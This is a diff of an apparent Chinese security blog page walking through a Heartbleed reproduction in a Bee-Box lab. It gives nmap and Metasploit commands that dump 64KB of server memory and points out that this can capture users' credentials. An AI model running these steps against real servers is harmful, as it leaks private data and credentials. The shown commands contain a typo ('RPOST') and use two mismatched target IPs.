@@ -181,26 +181,26 @@
 <h2 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h2><p>攻击机：Kali Linux</p>
 <p>靶机：Bee-Box环境</p>
 <p>靶机可以直接下载虚拟机镜像，直接在虚拟机打开即可。</p>
-<p><img src="/article/心脏滴血漏洞简单分析与复现/2.png" alt></p>
+<p><img src="/article/f98ca180/2.png" alt></p>
 <ul>
 <li><a href="https://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">下载链接</a></li>
 </ul>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>下载好之后打开终端，通过<code>ifconfig</code>命令查看虚拟机ip地址</p>
-<p><img src="/article/心脏滴血漏洞简单分析与复现/1.png" alt></p>
+<p><img src="/article/f98ca180/1.png" alt></p>
 <p>通过查看bee-box漏洞信息，发现在8443端口存在心脏滴血漏洞</p>
-<p><img src="/article/心脏滴血漏洞简单分析与复现/4.png" alt></p>
+<p><img src="/article/f98ca180/4.png" alt></p>
 <p>使用nmap扫描靶机ip的8443端口看是否存在心脏滴血漏洞</p>
 <p>命令<code>nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.31.127</code></p>
-<p><img src="/article/心脏滴血漏洞简单分析与复现/5.png" alt></p>
+<p><img src="/article/f98ca180/5.png" alt></p>
 <p>存在漏洞，打开msf，进行攻击</p>
 <p>使用<code>search heartbleed</code>查找攻击模块</p>
-<p><img src="/article/心脏滴血漏洞简单分析与复现/6.png" alt></p>
+<p><img src="/article/f98ca180/6.png" alt></p>
 <p>使用第一个<code>use auxiliary/scanner/ssl/openssl_heartbleed</code>，使用<code>show options</code>查看需要设置的参数</p>
-<p><img src="/article/心脏滴血漏洞简单分析与复现/7.png" alt></p>
+<p><img src="/article/f98ca180/7.png" alt></p>
 <p>设置 RHOST、RPOST</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 10.10.10.146</span><br><span class="line">set RPOST 8443</span><br><span class="line">set verbose true #设置成true才能看到泄露的信息</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p>运行后可以看到 靶机的64KB信息，如果有人此时在登录web应用，还可以直接抓到账号密码等信息。</p>
-<p><img src="/article/心脏滴血漏洞简单分析与复现/8.png" alt></p>
+<p><img src="/article/f98ca180/8.png" alt></p>
     </div>
   </div>
   
